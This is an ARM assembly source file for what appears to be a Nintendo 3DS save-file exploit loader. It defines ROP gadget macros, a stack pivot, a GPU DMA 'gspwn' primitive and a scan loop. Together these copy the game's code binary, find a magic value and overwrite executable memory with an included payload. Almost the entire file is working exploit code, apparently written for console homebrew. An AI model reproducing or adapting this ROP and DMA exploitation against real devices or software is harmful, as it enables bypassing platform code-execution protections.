.nds

.include "../build/constants.s"

.open "sploit_proto.bin","cn_save_initial_loader.bin",0x0

.arm

.macro set_lr,_lr
	.word ROP_CN_POP_R3PC ; pop {r3, pc}
		.word ROP_CN_POP_PC ; r3
	.word ROP_CN_POP_R4LR_BX_R3 ; pop {r4, lr} | bx r3
		.word 0xDEADBABE ; r4 (garbage)
		.word _lr ; lr
.endmacro

; dst_label has to be a file-address-soace address
.macro jump_sp,dst_label
	.word ROP_CN_POP_R3_ADD_SPR3_POP_PC
		.word dst_label - @@pivot_loc ; r3
	@@pivot_loc:
.endmacro

.macro ldr_r0,addr
	.word ROP_CN_POP_R0PC
		.word addr
	.word ROP_CN_LDR_R0R0_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro str_r0,addr
	.word ROP_CN_POP_R4PC
		.word addr
	.word ROP_CN_STR_R0R4_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro str_val,addr,val
	.word ROP_CN_POP_R0PC
		.word val
	str_r0 addr
.endmacro

.macro ldr_add_r0,addr,addval
	.word ROP_CN_POP_R0PC
		.word addr
	.word ROP_CN_LDR_R0R0_POP_R4PC
		.word addval ; r4
	.word ROP_CN_ADD_R0R4_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro cmp_derefptr_constaddr,addr,const
	ldr_add_r0 addr, 0x100000000 - const
	.word ROP_CN_CMP_R0x0_MVNNE_R0x0_MOVEQ_R0R4_POP_R4R5R6PC
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
.endmacro

.macro cmp_derefptr_r0addr,const,condr0
	.word ROP_CN_LDR_R0R0_POP_R4PC
		.word 0x100000000 - const
	.word ROP_CN_ADD_R0R4_POP_R4PC
		.word condr0 ; r4 (new value for r0 if [r0] == const)
	.word ROP_CN_CMP_R0x0_MVNNE_R0x0_MOVEQ_R0R4_POP_R4R5R6PC
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
.endmacro

.macro gspwn,dst,src,size
	set_lr ROP_CN_POP_R4R5R6R7R8R9R10R11PC
	.word ROP_CN_POP_R0PC ; pop {r0, pc}
		.word CN_GSPGPU_INTERRUPT_RECEIVER_STRUCT + 0x58 ; r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
	.word ROP_CN_POP_R1PC ; pop {r1, pc}
		.word CN_SECONDARYROP_DST + @@gxCommandPayload ; r1 (cmd addr)
	.word CN_GSPGPU_GXTRYENQUEUE
		@@gxCommandPayload:
		.word 0x00000004 ; command header (SetTextureCopy)
		.word src ; source address
		.word dst ; destination address (standin, will be filled in)
		.word size ; size
		.word 0x00000000 ; dim in
		.word 0x00000000 ; dim out
		.word 0x00000008 ; flags
		.word 0x00000000 ; unused
.endmacro

.macro gspwn_dstderefadd,dst_base,dst_offset_ptr,src,size,offset
	ldr_add_r0 dst_offset_ptr, dst_base 
	str_r0 @@gxCommandPayload + 0x8 + offset
	set_lr ROP_CN_POP_R4R5R6R7R8R9R10R11PC
	.word ROP_CN_POP_R0PC ; pop {r0, pc}
		.word CN_GSPGPU_INTERRUPT_RECEIVER_STRUCT + 0x58 ; r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
	.word ROP_CN_POP_R1PC ; pop {r1, pc}
		.word CN_SECONDARYROP_DST + @@gxCommandPayload ; r1 (cmd addr)
	.word CN_GSPGPU_GXTRYENQUEUE
		@@gxCommandPayload:
		.word 0x00000004 ; command header (SetTextureCopy)
		.word src ; source address
		.word 0xDEADBABE ; destination address (standin, will be filled in)
		.word size ; size
		.word 0xFFFFFFFF ; dim in
		.word 0xFFFFFFFF ; dim out
		.word 0x00000008 ; flags
		.word 0x00000000 ; unused
.endmacro

.macro flush_dcache,addr,size
	set_lr ROP_CN_NOP
	.word ROP_CN_POP_R0PC ; pop {r0, pc}
		.word CN_GSPHANDLE_ADR ; r0 (handle ptr)
	.word ROP_CN_POP_R1PC ; pop {r1, pc}
		.word 0xFFFF8001 ; r1 (process handle)
	.word ROP_CN_POP_R2R3R4PC ; pop {r2, r3, r4, pc}
		.word addr ; r2 (addr)
		.word size ; r3 (src)
		.word 0xDEADBABE ; r4 (garbage)
	.word CN_GSPGPU_FlushDataCache_ADR
.endmacro

.macro memcpy,dst,src,size
	set_lr ROP_CN_NOP
	.word ROP_CN_POP_R0PC ; pop {r0, pc}
		.word dst ; r0
	.word ROP_CN_POP_R1PC ; pop {r1, pc}
		.word src ; r1
	.word ROP_CN_POP_R2R3R4PC ; pop {r2, r3, r4, pc}
		.word size ; r2 (addr)
		.word 0xDEADC0DE ; r3 (garbage)
		.word 0xDEADC0DE ; r4 (garbage)
	.word CN_MEMCPY
.endmacro

.macro sleep,nanosec_low,nanosec_high
	set_lr ROP_CN_NOP
	.word ROP_CN_POP_R0PC ; pop {r0, pc}
		.word nanosec_low ; r0
	.word ROP_CN_POP_R1PC ; pop {r1, pc}
		.word nanosec_high ; r1
	.word CN_SLEEP
.endmacro

;length
.orga 0x60
	.word endROP-ROP+0xA8-0x64

;ROP
.orga 0xA8
ROP:
	;jump to safer place
		
		.word ROP_CN_POP_R0PC ; pop	{r0, pc}
			.word 0x0FFFFF28 ; r0 
		.word ROP_CN_LDR_R0R0_POP_R4PC ; ldr r0, [r0] | pop {r4, pc}
			.word CN_TMPVAR_ADR ; r4 (tmp var adr)
		.word ROP_CN_STR_R0R4_POP_R4PC ; str r0, [r4] | pop {r4, pc}
			.word CN_STACKPAYLOADADR+filePayloadOffset-ROP ; r4 (garbage)
		.word ROP_CN_STR_R0R4_POP_R4PC ; str r0, [r4] | pop {r4, pc}
			.word 0xDEADC0DE ; r4 (garbage)

		; perform memcpy 
		set_lr ROP_CN_POP_PC
		.word ROP_CN_POP_R0PC
			.word CN_SECONDARYROP_DST
		.word ROP_CN_POP_R1PC
		filePayloadOffset:
			.word 0xDEADC0DE ; r1 (garbage because gets overwritten by previous rop stff)
		.word ROP_CN_POP_R2R3R4PC
			.word secondaryROP_end ; r2 (size)
			.word 0xDEADC0DE ; r3 (garbage)
			.word 0xDEADC0DE ; r4 (garbage)
		.word CN_MEMCPY

		; jump to new rop buffer
		.word ROP_CN_POP_R3_ADD_SPR3_POP_PC
			.word CN_SECONDARYROP_DST - (CN_STACKPAYLOADADR - 0xA8)
endROP:

secondaryROP:

	; copy codebin data to linear heap so CPU can search through it
	gspwn CN_RANDCODEBIN_COPY_BASE, CN_RANDCODEBIN_BASE, CN_CODEBIN_SIZE
	sleep 200*1000*1000, 0x00000000

	; initialize loop variables
	str_val CN_SCANLOOP_CURPTR, CN_RANDCODEBIN_COPY_BASE - CN_SCANLOOP_STRIDE

	; for(u32* ptr = CN_RANDCODEBIN_COPY_BASE; *ptr != magic_value; ptr += CN_SCANLOOP_STRIDE/4);
	scan_loop:
		; increment ptr
		ldr_add_r0 CN_SCANLOOP_CURPTR, CN_SCANLOOP_STRIDE
		str_r0 CN_SCANLOOP_CURPTR

		; compare *ptr to magic_value
		cmp_derefptr_r0addr CN_SCANLOOP_MAGICVAL, (scan_loop_pivot_after - scan_loop_pivot - 1)

		; if conditional call above returns true, we overwrite scan_loop_pivot_offset with 8 (enough to skip real pivot), and 0 otherwise
		; that way we exit the loop conditionally
		.word ROP_CN_POP_R4PC
			.word 0x00000001 ; r4 (we do + 1 so that 0xFFFFFFFF becomes 0)
		.word ROP_CN_ADD_R0R4_POP_R4PC
			.word 0xDEADBABE ; r4 (garbage)
		str_r0 CN_SECONDARYROP_DST + scan_loop_pivot_offset

		; this pivot is initially unconditional but we overwrite the offset using conditional value to skip second pivot when we're done
		.word ROP_CN_POP_R3_ADD_SPR3_POP_PC
			scan_loop_pivot_offset:
			.word 0x00000000
		; this pivot is uncondintional always, it just happens to get skipped at the end
		scan_loop_pivot:
		jump_sp scan_loop
		scan_loop_pivot_after:

	memcpy CN_RANDCODEBIN_COPY_BASE, CN_SECONDARYROP_DST + codePatch, codePatchEnd - codePatch

	flush_dcache CN_RANDCODEBIN_COPY_BASE, 0x00100000

	gspwn_dstderefadd (CN_RANDCODEBIN_BASE) - (CN_RANDCODEBIN_COPY_BASE), CN_SCANLOOP_CURPTR, CN_RANDCODEBIN_COPY_BASE, 0x800, CN_SECONDARYROP_DST

	sleep 200*1000*1000, 0x00000000

	.word CN_SCANLOOP_TARGETCODE

	.align 4
	codePatch:
		.incbin "cn_initial/cn_initial.bin"
	codePatchEnd:

secondaryROP_end:

.Close
